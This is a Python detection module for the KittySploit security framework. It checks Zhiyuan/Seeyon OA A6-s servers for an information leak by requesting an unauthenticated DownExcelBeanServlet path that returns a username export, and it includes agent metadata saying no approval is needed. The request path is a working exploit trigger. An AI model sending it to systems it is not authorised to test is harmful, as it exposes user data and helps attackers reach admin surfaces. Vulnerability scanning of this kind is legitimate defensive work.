#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects Zhiyuan Oa A6-s info Leak."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zhiyuan Oa A6-s info Leak Detection',
        'description': 'Detects Zhiyuan Oa A6-s info Leak.',
        'author': ['KittySploit Team'],
        'severity': 'info',
        'tags': ['web', 'scanner', 'vulnerability', 'zhiyuan', 'leak', 'disclosure', 'seeyon', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/apachecn/sec-wiki/blob/c73367f88026f165b02a1116fe1f1cd2b8e8ac37/doc/unclassified/zhfly3351.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('attachment', 'application/x-msdownload',)
        if (all(m in headers for m in header_all)):
            self.set_info(
                severity='info',
                reason="Zhiyuan Oa A6-s info Leak detected",
                path='/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0',
            )
            return True
        return False

